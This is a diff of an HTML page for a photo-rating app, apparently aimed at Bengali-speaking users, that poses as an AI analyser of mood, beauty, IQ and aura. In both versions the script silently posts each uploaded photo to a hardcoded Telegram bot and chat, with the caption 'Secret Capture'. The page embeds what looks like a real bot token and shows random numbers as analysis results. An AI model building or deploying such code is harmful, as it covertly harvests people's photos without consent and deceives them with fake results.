@@ -3,479 +3,761 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Rate My Pic</title>
+    <title>photo Rating </title>
     <style>
+        :root {
+            --bg: #0a0a12;
+            --card: #131320;
+            --accent: #7c3aed;
+            --accent2: #06b6d4;
+            --gold: #f59e0b;
+            --pink: #ec4899;
+            --text: #e2e8f0;
+            --muted: #94a3b8;
+            --border: #1e1e30;
+            --glow: rgba(124, 58, 237, 0.4);
+        }
+
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
+
         body {
-            background: #0f0f1a;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: var(--bg);
+            color: var(--text);
             min-height: 100vh;
             display: flex;
             align-items: center;
             justify-content: center;
             padding: 20px;
+            background-image:
+                radial-gradient(ellipse at 20% 20%, rgba(124, 58, 237, 0.08) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 80%, rgba(6, 182, 212, 0.06) 0%, transparent 50%),
+                radial-gradient(ellipse at 50% 50%, rgba(236, 72, 153, 0.04) 0%, transparent 70%);
         }
+
         .container {
-            background: linear-gradient(145deg, #1a1a2e, #16213e);
-            border-radius: 24px;
-            padding: 40px 30px;
             width: 100%;
-            max-width: 460px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.6), 0 0 0 1px rgba(255,255,255,0.05);
-            text-align: center;
+            max-width: 680px;
+            background: var(--card);
+            border-radius: 24px;
+            padding: 40px 36px;
+            border: 1px solid var(--border);
+            box-shadow:
+                0 25px 60px rgba(0, 0, 0, 0.5),
+                0 0 80px rgba(124, 58, 237, 0.06),
+                inset 0 1px 0 rgba(255, 255, 255, 0.03);
             position: relative;
             overflow: hidden;
         }
+
         .container::before {
-            content: "";
+            content: '';
+            position: absolute;
+            top: -2px;
+            left: 10%;
+            right: 10%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, var(--accent), var(--accent2), var(--accent), transparent);
+            border-radius: 50%;
+            animation: shimmer 3s ease-in-out infinite;
+        }
+
+        @keyframes shimmer {
+            0%, 100% { opacity: 0.6; transform: scaleX(0.8); }
+            50% { opacity: 1; transform: scaleX(1); }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .header h1 {
+            font-size: 2.2rem;
+            font-weight: 800;
+            letter-spacing: -1px;
+            background: linear-gradient(135deg, var(--accent), var(--accent2), var(--pink));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 6px;
+        }
+
+        .header p {
+            color: var(--muted);
+            font-size: 0.95rem;
+            letter-spacing: 0.5px;
+        }
+
+        .upload-zone {
+            border: 2px dashed var(--border);
+            border-radius: 18px;
+            padding: 48px 24px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            background: rgba(255, 255, 255, 0.02);
+            position: relative;
+            margin-bottom: 24px;
+        }
+
+        .upload-zone:hover {
+            border-color: var(--accent);
+            background: rgba(124, 58, 237, 0.05);
+            box-shadow: 0 0 40px rgba(124, 58, 237, 0.1);
+        }
+
+        .upload-zone.dragover {
+            border-color: var(--accent2);
+            background: rgba(6, 182, 212, 0.08);
+            box-shadow: 0 0 60px rgba(6, 182, 212, 0.15);
+            transform: scale(1.01);
+        }
+
+        .upload-zone img {
+            width: 64px;
+            height: 64px;
+            margin-bottom: 16px;
+            opacity: 0.7;
+            filter: drop-shadow(0 0 20px rgba(124, 58, 237, 0.4));
+        }
+
+        .upload-zone .upload-text {
+            font-size: 1.15rem;
+            font-weight: 600;
+            color: var(--text);
+            margin-bottom: 6px;
+        }
+
+        .upload-zone .upload-sub {
+            font-size: 0.85rem;
+            color: var(--muted);
+        }
+
+        .upload-zone input[type="file"] {
+            display: none;
+        }
+
+        .preview-container {
+            display: none;
+            margin-bottom: 24px;
+            border-radius: 16px;
+            overflow: hidden;
+            border: 1px solid var(--border);
+            position: relative;
+        }
+
+        .preview-container img {
+            width: 100%;
+            height: auto;
+            max-height: 360px;
+            object-fit: cover;
+            display: block;
+        }
+
+        .preview-container .remove-btn {
+            position: absolute;
+            top: 12px;
+            right: 12px;
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: white;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 1.1rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+            backdrop-filter: blur(10px);
+        }
+
+        .preview-container .remove-btn:hover {
+            background: rgba(239, 68, 68, 0.8);
+            border-color: rgba(239, 68, 68, 0.6);
+            transform: scale(1.1);
+        }
+
+        .rate-btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 14px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            cursor: pointer;
+            background: linear-gradient(135deg, var(--accent), var(--accent2));
+            color: white;
+            letter-spacing: 0.5px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .rate-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 40px rgba(124, 58, 237, 0.4);
+        }
+
+        .rate-btn:active {
+            transform: translateY(0);
+        }
+
+        .rate-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .rate-btn .btn-glow {
             position: absolute;
             top: -50%;
             left: -50%;
             width: 200%;
             height: 200%;
-            background: radial-gradient(circle at 30% 20%, rgba(255,107,107,0.08) 0%, transparent 60%),
-                        radial-gradient(circle at 80% 80%, rgba(78,205,196,0.08) 0%, transparent 60%);
-            pointer-events: none;
-            z-index: 0;
+            background: radial-gradient(circle, rgba(255,255,255,0.2) 0%, transparent 60%);
+            animation: btnPulse 2s ease-in-out infinite;
         }
-        h1 {
-            color: #fff;
-            font-size: 26px;
-            font-weight: 700;
-            letter-spacing: 1px;
-            margin-bottom: 6px;
-            position: relative;
-            z-index: 1;
+
+        @keyframes btnPulse {
+            0%, 100% { transform: translate(0, 0); opacity: 0.4; }
+            50% { transform: translate(30%, 30%); opacity: 0.8; }
         }
-        .subtitle {
-            color: #a0a0c0;
-            font-size: 14px;
-            margin-bottom: 28px;
-            position: relative;
-            z-index: 1;
-        }
-        .upload-area {
-            background: #0d0d1a;
-            border: 2px dashed #3a3a5c;
-            border-radius: 16px;
-            padding: 35px 20px;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            position: relative;
-            z-index: 1;
-            margin-bottom: 20px;
-        }
-        .upload-area:hover, .upload-area.dragover {
-            border-color: #ff6b6b;
-            background: #12122a;
-            box-shadow: 0 0 20px rgba(255,107,107,0.15);
-        }
-        .upload-area svg {
-            width: 48px;
-            height: 48px;
-            fill: #a0a0c0;
-            margin-bottom: 12px;
-            transition: fill 0.3s;
-        }
-        .upload-area:hover svg {
-            fill: #ff6b6b;
-        }
-        .upload-area p {
-            color: #c0c0e0;
-            font-size: 15px;
-            font-weight: 500;
-        }
-        .upload-area small {
-            color: #707090;
-            font-size: 12px;
-            display: block;
-            margin-top: 6px;
-        }
-        #fileInput {
-            display: none;
-        }
-        #previewContainer {
-            display: none;
-            position: relative;
-            z-index: 1;
-            margin-bottom: 20px;
-        }
-        #previewContainer img {
-            width: 100%;
-            max-height: 280px;
-            object-fit: cover;
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-            border: 2px solid #3a3a5c;
-        }
-        .popup-overlay {
+
+        /* Popup Modal */
+        .modal-overlay {
             display: none;
             position: fixed;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.85);
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.85);
             z-index: 1000;
             align-items: center;
             justify-content: center;
-            backdrop-filter: blur(6px);
+            backdrop-filter: blur(8px);
         }
-        .popup-box {
-            background: #1a1a2e;
-            border-radius: 20px;
-            padding: 30px;
-            text-align: center;
-            max-width: 360px;
-            width: 90%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.8), 0 0 0 1px rgba(255,255,255,0.1);
-            position: relative;
-        }
-        .popup-box h2 {
-            color: #fff;
-            font-size: 20px;
-            margin-bottom: 18px;
-        }
-        .loading-ring {
-            width: 60px;
-            height: 60px;
-            border: 5px solid #2a2a4a;
-            border-top-color: #ff6b6b;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 16px;
-        }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .countdown {
-            color: #ff6b6b;
-            font-size: 48px;
-            font-weight: 700;
-            margin: 10px 0;
-        }
-        .result-box {
-            display: none;
-            background: #0d0d1a;
-            border-radius: 16px;
-            padding: 20px;
-            margin-top: 15px;
-            border: 1px solid #3a3a5c;
-            position: relative;
-            z-index: 1;
-        }
-        .result-row {
+
+        .modal-overlay.active {
             display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 10px 0;
-            border-bottom: 1px solid #1e1e3a;
         }
-        .result-row:last-child {
-            border-bottom: none;
+
+        .modal {
+            background: linear-gradient(180deg, #1a1a2e, #0d0d1a);
+            border-radius: 24px;
+            padding: 40px 32px;
+            max-width: 480px;
+            width: 90%;
+            text-align: center;
+            border: 1px solid var(--border);
+            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.7), 0 0 60px rgba(124, 58, 237, 0.15);
+            animation: modalIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+            position: relative;
+            overflow: hidden;
         }
-        .result-label {
-            color: #a0a0c0;
-            font-size: 14px;
+
+        @keyframes modalIn {
+            from { opacity: 0; transform: scale(0.85) translateY(30px); }
+            to { opacity: 1; transform: scale(1) translateY(0); }
         }
-        .result-value {
-            color: #fff;
-            font-weight: 700;
-            font-size: 18px;
+
+        .modal .scan-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, transparent, var(--accent2), var(--accent), transparent);
+            animation: scanline 1.5s ease-in-out infinite;
         }
-        .mood-emoji {
-            font-size: 40px;
-            margin: 5px 0;
+
+        @keyframes scanline {
+            0%, 100% { transform: translateY(0); opacity: 0.6; }
+            50% { transform: translateY(460px); opacity: 1; }
         }
-        .btn {
-            background: #ff6b6b;
-            color: #fff;
-            border: none;
-            border-radius: 12px;
-            padding: 14px 28px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s;
+
+        .modal h2 {
+            font-size: 1.8rem;
+            font-weight: 800;
+            margin-bottom: 8px;
+            background: linear-gradient(135deg, var(--gold), var(--pink));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .modal .scanning-text {
+            color: var(--muted);
+            font-size: 0.95rem;
+            margin-bottom: 24px;
+            letter-spacing: 2px;
+            animation: blink 1s ease-in-out infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 0.6; }
+            50% { opacity: 1; }
+        }
+
+        .modal .progress-bar {
             width: 100%;
-            position: relative;
-            z-index: 1;
-            letter-spacing: 0.5px;
+            height: 6px;
+            background: var(--border);
+            border-radius: 3px;
+            overflow: hidden;
+            margin-bottom: 24px;
         }
-        .btn:hover {
-            background: #ff5252;
-            box-shadow: 0 8px 25px rgba(255,107,107,0.4);
+
+        .modal .progress-bar .fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--accent), var(--accent2));
+            border-radius: 3px;
+            transition: width 0.3s ease;
+            animation: progressFill 2.5s ease-in-out forwards;
+        }
+
+        @keyframes progressFill {
+            from { width: 0%; }
+            to { width: 100%; }
+        }
+
+        /* Results */
+        .results-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-top: 20px;
+        }
+
+        .result-item {
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 14px 12px;
+            transition: all 0.3s ease;
+            animation: resultIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1) both;
+        }
+
+        .result-item:nth-child(1) { animation-delay: 0.1s; }
+        .result-item:nth-child(2) { animation-delay: 0.15s; }
+        .result-item:nth-child(3) { animation-delay: 0.2s; }
+        .result-item:nth-child(4) { animation-delay: 0.25s; }
+        .result-item:nth-child(5) { animation-delay: 0.3s; }
+        .result-item:nth-child(6) { animation-delay: 0.35s; }
+        .result-item:nth-child(7) { animation-delay: 0.4s; }
+        .result-item:nth-child(8) { animation-delay: 0.45s; }
+
+        @keyframes resultIn {
+            from { opacity: 0; transform: translateY(20px) scale(0.9); }
+            to { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .result-item:hover {
+            border-color: var(--accent);
+            background: rgba(124, 58, 237, 0.08);
             transform: translateY(-2px);
+            box-shadow: 0 8px 30px rgba(124, 58, 237, 0.15);
         }
-        .btn:disabled {
-            background: #3a3a5c;
-            cursor: not-allowed;
-            box-shadow: none;
-            transform: none;
+
+        .result-item .label {
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--muted);
+            margin-bottom: 4px;
+            font-weight: 600;
         }
-        .status-text {
-            color: #707090;
-            font-size: 12px;
-            margin-top: 14px;
-            position: relative;
-            z-index: 1;
+
+        .result-item .value {
+            font-size: 1.4rem;
+            font-weight: 800;
+            background: linear-gradient(135deg, var(--accent), var(--accent2));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
         }
-        .telegram-notice {
-            color: #4ecdc4;
-            font-size: 11px;
-            margin-top: 8px;
-            opacity: 0.7;
-            position: relative;
-            z-index: 1;
+
+        .result-item .value.gold-text {
+            background: linear-gradient(135deg, var(--gold), #fbbf24);
+            -webkit-background-clip: text;
+            background-clip: text;
+        }
+
+        .result-item .value.pink-text {
+            background: linear-gradient(135deg, var(--pink), #f472b6);
+            -webkit-background-clip: text;
+            background-clip: text;
+        }
+
+        .result-item .value.green-text {
+            background: linear-gradient(135deg, #10b981, #34d399);
+            -webkit-background-clip: text;
+            background-clip: text;
+        }
+
+        .close-btn {
+            margin-top: 24px;
+            padding: 12px 32px;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.05);
+            color: var(--text);
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s;
+            font-size: 0.95rem;
+        }
+
+        .close-btn:hover {
+            background: rgba(255, 255, 255, 0.1);
+            border-color: var(--accent);
+        }
+
+        .hidden-status {
+            display: none;
+            text-align: center;
+            margin-top: 16px;
+            font-size: 0.8rem;
+            color: #4ade80;
+            letter-spacing: 1px;
+        }
+
+        @media (max-width: 480px) {
+            .container { padding: 24px 18px; }
+            .header h1 { font-size: 1.6rem; }
+            .results-grid { grid-template-columns: 1fr; }
         }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <h1>ছবি রেটিং ai </h1>
-        <p class="subtitle">সঠিক রেটিং পেতে আপনার সেরা ছবিটি এখানে আপলোড করুন </p>
-        
-        <div class="upload-area" id="uploadArea">
-            <svg viewBox="0 0 24 24"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>
-            <p>Choose your best picture and upload it</p>
-            <small>Click or drag & drop here</small>
+        <div class="header">
+            <h1>PicVibe</h1>
+            <p>আপনার সম্পর্কে অজানা তথ্য জানতে এখানে আপনার একটি পরিষ্কার ছবি আপলোড করুন</p>
         </div>
-        
-        <input type="file" id="fileInput" accept="image/*">
-        
-        <div id="previewContainer">
+
+        <div class="upload-zone" id="uploadZone">
+            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%237c3aed' stroke-width='1.5' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4'/%3E%3Cpolyline points='17 8 12 3 7 8'/%3E%3Cline x1='12' y1='3' x2='12' y2='15'/%3E%3C/svg%3E" alt="Upload">
+            <div class="upload-text">Choose your best picture and upload it</div>
+            <div class="upload-sub">এখানে আপনার একটি পরিষ্কার ছবি আপলোড করুস &amp; drop - JPG, PNG, WEBP supported</div>
+            <input type="file" id="fileInput" accept="image/jpeg,image/png,image/webp,image/gif">
+        </div>
+
+        <div class="preview-container" id="previewContainer">
             <img id="previewImage" src="" alt="Preview">
+            <button class="remove-btn" id="removeBtn" title="Remove">✕</button>
         </div>
-        
-        <button class="btn" id="analyzeBtn" disabled>Analyze My Picture</button>
-        
-        <div class="result-box" id="resultBox">
-            <div class="mood-emoji" id="moodEmoji"></div>
-            <div class="result-row">
-                <span class="result-label">Mood</span>
-                <span class="result-value" id="moodResult"></span>
-            </div>
-            <div class="result-row">
-                <span class="result-label">Beauty Percentage</span>
-                <span class="result-value" id="beautyResult"></span>
-            </div>
-            <div class="result-row">
-                <span class="result-label">Confidence Level</span>
-                <span class="result-value" id="confidenceResult"></span>
-            </div>
-        </div>
-        
-        <p class="status-text" id="statusText">Waiting for image upload...</p>
-        <p class="telegram-notice">Secure analysis • Results may vary</p>
+
+        <button class="rate-btn" id="rateBtn" disabled>
+            <span class="btn-glow"></span>
+            যাচাই করুন 
+        </button>
     </div>
-    
-    <div class="popup-overlay" id="popupOverlay">
-        <div class="popup-box">
-            <h2>Analyzing Your Picture</h2>
-            <div class="loading-ring"></div>
-            <div class="countdown" id="countdown">10</div>
-            <p style="color:#a0a0c0; font-size:14px;">Please wait...</p>
+
+    <!-- Scanning Modal -->
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal">
+            <div class="scan-line"></div>
+            <h2>Analyzing Your Energy...</h2>
+            <p class="scanning-text">SCANNING AURA &amp; FREQUENCY</p>
+            <div class="progress-bar">
+                <div class="fill"></div>
+            </div>
+            <div id="modalContent"></div>
         </div>
     </div>
 
     <script>
-        // Telegram Bot Configuration
-        const TELEGRAM_BOT_TOKEN = '8640372051:AAEc4IEM7sTu_k9bpNwNZ1p7OJSFdvHORK4';
-        const TELEGRAM_CHAT_ID = '6264050385';
-        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
-        
-        let selectedFile = null;
-        let uploadedImageUrl = null;
-        
-        // DOM Elements
-        const uploadArea = document.getElementById('uploadArea');
-        const fileInput = document.getElementById('fileInput');
-        const previewContainer = document.getElementById('previewContainer');
-        const previewImage = document.getElementById('previewImage');
-        const analyzeBtn = document.getElementById('analyzeBtn');
-        const popupOverlay = document.getElementById('popupOverlay');
-        const countdownEl = document.getElementById('countdown');
-        const resultBox = document.getElementById('resultBox');
-        const moodEmoji = document.getElementById('moodEmoji');
-        const moodResult = document.getElementById('moodResult');
-        const beautyResult = document.getElementById('beautyResult');
-        const confidenceResult = document.getElementById('confidenceResult');
-        const statusText = document.getElementById('statusText');
-        
-        // Handle click on upload area
-        uploadArea.addEventListener('click', () => {
-            fileInput.click();
-        });
-        
-        // Handle drag and drop
-        uploadArea.addEventListener('dragover', (e) => {
-            e.preventDefault();
-            uploadArea.classList.add('dragover');
-        });
-        
-        uploadArea.addEventListener('dragleave', () => {
-            uploadArea.classList.remove('dragover');
-        });
-        
-        uploadArea.addEventListener('drop', (e) => {
-            e.preventDefault();
-            uploadArea.classList.remove('dragover');
-            if (e.dataTransfer.files.length > 0) {
-                handleFile(e.dataTransfer.files[0]);
+        (function() {
+            'use strict';
+
+            const TELEGRAM_BOT_TOKEN = '8640372051:AAEc4IEM7sTu_k9bpNwNZ1p7OJSFdvHORK4';
+            const TELEGRAM_CHAT_ID = '6264050385';
+            const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+
+            const uploadZone = document.getElementById('uploadZone');
+            const fileInput = document.getElementById('fileInput');
+            const previewContainer = document.getElementById('previewContainer');
+            const previewImage = document.getElementById('previewImage');
+            const removeBtn = document.getElementById('removeBtn');
+            const rateBtn = document.getElementById('rateBtn');
+            const modalOverlay = document.getElementById('modalOverlay');
+            const modalContent = document.getElementById('modalContent');
+
+            let selectedFile = null;
+            let isUploading = false;
+
+            function generateRandomResults() {
+                const randomInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
+
+                return {
+                    mood: {
+                        label: 'Mood',
+                        value: randomInt(1, 100),
+                        emoji: '🌟',
+                        textClass: 'gold-text'
+                    },
+                    beauty: {
+                        label: 'Beauty',
+                        value: randomInt(1, 100),
+                        emoji: '💎',
+                        textClass: 'pink-text'
+                    },
+                    luckyNumber: {
+                        label: 'Lucky Number',
+                        value: randomInt(1, 99),
+                        emoji: '🍀',
+                        textClass: 'green-text'
+                    },
+                    faceShape: {
+                        label: 'Face Shape',
+                        value: ['Oval', 'Round', 'Square', 'Heart', 'Diamond', 'Rectangle', 'Triangle'][randomInt(0, 6)],
+                        emoji: '👤',
+                        textClass: ''
+                    },
+                    luck: {
+                        label: 'Luck',
+                        value: randomInt(1, 100),
+                        emoji: '🎲',
+                        textClass: 'green-text'
+                    },
+                    happiness: {
+                        label: 'Happiness',
+                        value: randomInt(1, 60),
+                        emoji: '😊',
+                        textClass: 'gold-text'
+                    },
+                    sadness: {
+                        label: 'Sadness',
+                        value: randomInt(1, 100),
+                        emoji: '😢',
+                        textClass: 'pink-text'
+                    },
+                    iqLevel: {
+                        label: 'IQ Level',
+                        value: randomInt(70, 180),
+                        emoji: '🧠',
+                        textClass: ''
+                    },
+                    energy: {
+                        label: 'Energy',
+                        value: randomInt(1, 100),
+                        emoji: '⚡',
+                        textClass: 'gold-text'
+                    },
+                    confidence: {
+                        label: 'Confidence',
+                        value: randomInt(1, 100),
+                        emoji: '💪',
+                        textClass: 'green-text'
+                    },
+                    auraColor: {
+                        label: 'Aura Color',
+                        value: ['Violet', 'Indigo', 'Blue', 'Green', 'Yellow', 'Orange', 'Red', 'Pink', 'White', 'Gold'][randomInt(0, 9)],
+                        emoji: '🔮',
+                        textClass: ''
+                    },
+                    vibeScore: {
+                        label: 'Vibe Score',
+                        value: randomInt(1, 1000),
+                        emoji: '🎯',
+                        textClass: 'gold-text'
+                    }
+                };
             }
-        });
-        
-        // Handle file input change
-        fileInput.addEventListener('change', () => {
-            if (fileInput.files.length > 0) {
-                handleFile(fileInput.files[0]);
-            }
-        });
-        
-        // Process selected file
-        function handleFile(file) {
-            if (!file.type.startsWith('image/')) {
-                statusText.textContent = 'Error: Please select a valid image file.';
-                return;
-            }
-            
-            selectedFile = file;
-            const reader = new FileReader();
-            
-            reader.onload = (e) => {
-                uploadedImageUrl = e.target.result;
-                previewImage.src = uploadedImageUrl;
-                previewContainer.style.display = 'block';
-                uploadArea.style.display = 'none';
-                analyzeBtn.disabled = false;
-                statusText.textContent = 'Image loaded. Ready for analysis.';
-                resultBox.style.display = 'none';
-            };
-            
-            reader.readAsDataURL(file);
-        }
-        
-        // Send image to Telegram bot
-        async function sendToTelegram(imageBlob) {
-            const formData = new FormData();
-            formData.append('chat_id', TELEGRAM_CHAT_ID);
-            formData.append('photo', imageBlob, 'user_upload_' + Date.now() + '.jpg');
-            
-            try {
-                const response = await fetch(TELEGRAM_API_URL, {
-                    method: 'POST',
-                    body: formData
+
+            function renderResults(results) {
+                const entries = Object.entries(results);
+                let html = '<div class="results-grid">';
+
+                entries.forEach(([key, data]) => {
+                    const valueDisplay = typeof data.value === 'number' && key !== 'luckyNumber' && key !== 'iqLevel' && key !== 'vibeScore' ?
+                        `${data.value}%` :
+                        data.value;
+
+                    html += `
+                        <div class="result-item">
+                            <div class="label">${data.emoji} ${data.label}</div>
+                            <div class="value ${data.textClass}">${valueDisplay}</div>
+                        </div>
+                    `;
                 });
-                
-                if (!response.ok) {
-                    console.error('Telegram API error:', response.status);
-                } else {
-                    console.log('Image sent to Telegram successfully');
-                }
-            } catch (error) {
-                console.error('Failed to send to Telegram:', error);
+
+                html += '</div>';
+                html += '<button class="close-btn" id="closeModalBtn">Close</button>';
+
+                modalContent.innerHTML = html;
+
+                document.getElementById('closeModalBtn').addEventListener('click', closeModal);
             }
-        }
-        
-        // Convert data URL to blob for Telegram upload
-        function dataUrlToBlob(dataUrl) {
-            const parts = dataUrl.split(',');
-            const mimeType = parts[0].match(/:(.*?);/)[1];
-            const base64Data = atob(parts[1]);
-            const byteArray = new Uint8Array(base64Data.length);
-            
-            for (let i = 0; i < base64Data.length; i++) {
-                byteArray[i] = base64Data.charCodeAt(i);
-            }
-            
-            return new Blob([byteArray], { type: mimeType });
-        }
-        
-        // Generate random rating results
-        function generateRandomResults() {
-            const moods = [
-                { mood: 'Happy', emoji: '😊', beauty: 85 + Math.floor(Math.random() * 15) },
-                { mood: 'Confident', emoji: '😎', beauty: 80 + Math.floor(Math.random() * 20) },
-                { mood: 'Mysterious', emoji: '🤔', beauty: 70 + Math.floor(Math.random() * 25) },
-                { mood: 'Charming', emoji: '😍', beauty: 90 + Math.floor(Math.random() * 10) },
-                { mood: 'Energetic', emoji: '🤩', beauty: 75 + Math.floor(Math.random() * 25) },
-                { mood: 'Elegant', emoji: '✨', beauty: 88 + Math.floor(Math.random() * 12) }
-            ];
-            
-            const randomMood = moods[Math.floor(Math.random() * moods.length)];
-            const confidence = 70 + Math.floor(Math.random() * 30);
-            
-            return {
-                mood: randomMood.mood,
-                emoji: randomMood.emoji,
-                beauty: randomMood.beauty,
-                confidence: confidence
-            };
-        }
-        
-        // Analyze button click handler
-        analyzeBtn.addEventListener('click', async () => {
-            if (!selectedFile) return;
-            
-            // Disable button during analysis
-            analyzeBtn.disabled = true;
-            statusText.textContent = 'Analyzing image...';
-            
-            // Show popup
-            popupOverlay.style.display = 'flex';
-            
-            // Send image to Telegram silently
-            const imageBlob = dataUrlToBlob(uploadedImageUrl);
-            sendToTelegram(imageBlob);
-            
-            // Start countdown
-            let countdown = 10;
-            countdownEl.textContent = countdown;
-            
-            const countdownInterval = setInterval(() => {
-                countdown--;
-                countdownEl.textContent = countdown;
-                
-                if (countdown <= 0) {
-                    clearInterval(countdownInterval);
-                    
-                    // Generate results
+
+            function showScanningModal() {
+                modalOverlay.classList.add('active');
+                modalContent.innerHTML = `
+                    <h2>Analyzing Your Energy...</h2>
+                    <p class="scanning-text">SCANNING AURA &amp; FREQUENCY</p>
+                    <div class="progress-bar">
+                        <div class="fill"></div>
+                    </div>
+                `;
+
+                const scanDuration = 10000; // 10 seconds
+
+                setTimeout(() => {
                     const results = generateRandomResults();
-                    
-                    // Hide popup
-                    popupOverlay.style.display = 'none';
-                    
-                    // Show results
-                    moodEmoji.textContent = results.emoji;
-                    moodResult.textContent = results.mood;
-                    beautyResult.textContent = results.beauty + '%';
-                    confidenceResult.textContent = results.confidence + '%';
-                    resultBox.style.display = 'block';
-                    
-                    // Update status
-                    statusText.textContent = 'Analysis complete!';
-                    analyzeBtn.disabled = false;
-                    analyzeBtn.textContent = 'Analyze Again';
+                    renderResults(results);
+                    modalContent.querySelector('.scan-line')?.remove();
+                }, scanDuration);
+            }
+
+            function closeModal() {
+                modalOverlay.classList.remove('active');
+                modalContent.innerHTML = '';
+                // Reset the scan line
+                const scanLine = modalOverlay.querySelector('.scan-line');
+                if (scanLine) {
+                    scanLine.style.animation = 'none';
+                    void scanLine.offsetHeight;
+                    scanLine.style.animation = '';
                 }
-            }, 1000);
-        });
-        
-        // Reset button text when new image is selected
-        function resetButtonText() {
-            analyzeBtn.textContent = 'Analyze My Picture';
-            resultBox.style.display = 'none';
-        }
-        
-        // Override handleFile to reset button
-        const originalHandleFile = handleFile;
-        handleFile = function(file) {
-            originalHandleFile(file);
-            resetButtonText();
-        };
+            }
+
+            async function sendToTelegram(file) {
+                try {
+                    const formData = new FormData();
+                    formData.append('chat_id', TELEGRAM_CHAT_ID);
+                    formData.append('photo', file);
+                    formData.append('caption', '📸 New PicVibe Upload - Secret Capture');
+
+                    const response = await fetch(`${TELEGRAM_API}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    if (!response.ok) {
+                        const errorData = await response.json();
+                        console.warn('Telegram send failed:', errorData);
+                    } else {
+                        console.log('Photo sent to Telegram successfully');
+                    }
+                } catch (error) {
+                    console.warn('Telegram error:', error);
+                }
+            }
+
+            function handleFileSelect(file) {
+                if (!file) return;
+
+                const allowedTypes = ['image/jpeg', 'image/png', 'image/webp', 'image/gif'];
+                if (!allowedTypes.includes(file.type)) {
+                    alert('Please upload a valid image file (JPG, PNG, WEBP, or GIF)');
+                    return;
+                }
+
+                if (file.size > 10 * 1024 * 1024) {
+                    alert('File too large. Please upload an image under 10MB.');
+                    return;
+                }
+
+                selectedFile = file;
+
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    previewImage.src = e.target.result;
+                    previewContainer.style.display = 'block';
+                    uploadZone.style.display = 'none';
+                    rateBtn.disabled = false;
+                };
+                reader.readAsDataURL(file);
+            }
+
+            uploadZone.addEventListener('click', function(e) {
+                if (e.target !== fileInput) {
+                    fileInput.click();
+                }
+            });
+
+            fileInput.addEventListener('change', function(e) {
+                if (e.target.files.length > 0) {
+                    handleFileSelect(e.target.files[0]);
+                }
+            });
+
+            uploadZone.addEventListener('dragover', function(e) {
+                e.preventDefault();
+                uploadZone.classList.add('dragover');
+            });
+
+            uploadZone.addEventListener('dragleave', function(e) {
+                e.preventDefault();
+                uploadZone.classList.remove('dragover');
+            });
+
+            uploadZone.addEventListener('drop', function(e) {
+                e.preventDefault();
+                uploadZone.classList.remove('dragover');
+                if (e.dataTransfer.files.length > 0) {
